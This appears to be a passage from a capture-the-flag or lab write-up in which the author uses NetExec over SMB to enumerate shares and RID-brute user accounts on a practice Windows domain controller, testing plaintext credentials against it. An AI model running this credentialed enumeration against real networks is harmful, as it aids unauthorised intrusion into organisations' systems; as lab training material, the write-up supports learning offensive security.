
```sh
┌──(fixit42㉿kali)-[~]
└─$ nxc smb 10.1.17.88 -u 'r.widdleton' -p 'lilronron' --shares
SMB         10.1.17.88      445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:BUILDINGMAGIC.LOCAL) (signing:True) (SMBv1:False)
SMB         10.1.17.88      445    DC01             [+] BUILDINGMAGIC.LOCAL\r.widdleton:lilronron 
SMB         10.1.17.88      445    DC01             [*] Enumerated shares
SMB         10.1.17.88      445    DC01             Share           Permissions     Remark
SMB         10.1.17.88      445    DC01             -----           -----------     ------
SMB         10.1.17.88      445    DC01             ADMIN$                          Remote Admin
SMB         10.1.17.88      445    DC01             C$                              Default share
SMB         10.1.17.88      445    DC01             File-Share                      Central Repository of Building Magic's files.
SMB         10.1.17.88      445    DC01             IPC$            READ            Remote IPC
SMB         10.1.17.88      445    DC01             NETLOGON                        Logon server share 
SMB         10.1.17.88      445    DC01             SYSVOL                          Logon server share 
```

```sh
┌──(fixit42㉿kali)-[~]
└─$ nxc smb 10.1.17.88 -u 'r.widdleton' -p 'lilronron' --rid-brute
SMB         10.1.17.88      445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:BUILDINGMAGIC.LOCAL) (signing:True) (SMBv1:False)
SMB         10.1.17.88      445    DC01             [+] BUILDINGMAGIC.LOCAL\r.widdleton:lilronron 
SMB         10.1.17.88      445    DC01             498: BUILDINGMAGIC\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.1.17.88      445    DC01             500: BUILDINGMAGIC\Administrator (SidTypeUser)
SMB         10.1.17.88      445    DC01             501: BUILDINGMAGIC\Guest (SidTypeUser)
SMB         10.1.17.88      445    DC01             502: BUILDINGMAGIC\krbtgt (SidTypeUser)
SMB         10.1.17.88      445    DC01             512: BUILDINGMAGIC\Domain Admins (SidTypeGroup)
SMB         10.1.17.88      445    DC01             513: BUILDINGMAGIC\Domain Users (SidTypeGroup)
SMB         10.1.17.88      445    DC01             514: BUILDINGMAGIC\Domain Guests (SidTypeGroup)
SMB         10.1.17.88      445    DC01             515: BUILDINGMAGIC\Domain Computers (SidTypeGroup)
SMB         10.1.17.88      445    DC01             516: BUILDINGMAGIC\Domain Controllers (SidTypeGroup)
SMB         10.1.17.88      445    DC01             517: BUILDINGMAGIC\Cert Publishers (SidTypeAlias)
SMB         10.1.17.88      445    DC01             518: BUILDINGMAGIC\Schema Admins (SidTypeGroup)
SMB         10.1.17.88      445    DC01             519: BUILDINGMAGIC\Enterprise Admins (SidTypeGroup)
SMB         10.1.17.88      445    DC01             520: BUILDINGMAGIC\Group Policy Creator Owners (SidTypeGroup)
SMB         10.1.17.88      445    DC01             521: BUILDINGMAGIC\Read-only Domain Controllers (SidTypeGroup)
SMB         10.1.17.88      445    DC01             522: BUILDINGMAGIC\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.1.17.88      445    DC01             525: BUILDINGMAGIC\Protected Users (SidTypeGroup)
SMB         10.1.17.88      445    DC01             526: BUILDINGMAGIC\Key Admins (SidTypeGroup)
SMB         10.1.17.88      445    DC01             527: BUILDINGMAGIC\Enterprise Key Admins (SidTypeGroup)
SMB         10.1.17.88      445    DC01             553: BUILDINGMAGIC\RAS and IAS Servers (SidTypeAlias)
SMB         10.1.17.88      445    DC01             571: BUILDINGMAGIC\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.1.17.88      445    DC01             572: BUILDINGMAGIC\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.1.17.88      445    DC01             1000: BUILDINGMAGIC\DC01$ (SidTypeUser)
SMB         10.1.17.88      445    DC01             1101: BUILDINGMAGIC\DnsAdmins (SidTypeAlias)
SMB         10.1.17.88      445    DC01             1102: BUILDINGMAGIC\DnsUpdateProxy (SidTypeGroup)
SMB         10.1.17.88      445    DC01             1104: BUILDINGMAGIC\h.potch (SidTypeUser)
SMB         10.1.17.88      445    DC01             1111: BUILDINGMAGIC\r.widdleton (SidTypeUser)
SMB         10.1.17.88      445    DC01             1112: BUILDINGMAGIC\r.haggard (SidTypeUser)
SMB         10.1.17.88      445    DC01             1113: BUILDINGMAGIC\h.grangon (SidTypeUser)
SMB         10.1.17.88      445    DC01             1115: BUILDINGMAGIC\a.flatch (SidTypeUser)
```

```sh
┌──(fixit42㉿kali)-[~]
└─$ nxc smb 10.1.17.88 -u 't.ren' -p 'shadowhex7' --shares
SMB         10.1.17.88      445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:BUILDINGMAGIC.LOCAL) (signing:True) (SMBv1:False)
SMB         10.1.17.88      445    DC01             [-] BUILDINGMAGIC.LOCAL\t.ren:shadowhex7 STATUS_LOGON_FAILURE
```

confirming from rid-brute that t.ren doesn't exist

the rest of the existing users are:
h.potch
r.haggard
h.grangon
a.flatch

none of these are in the password list!

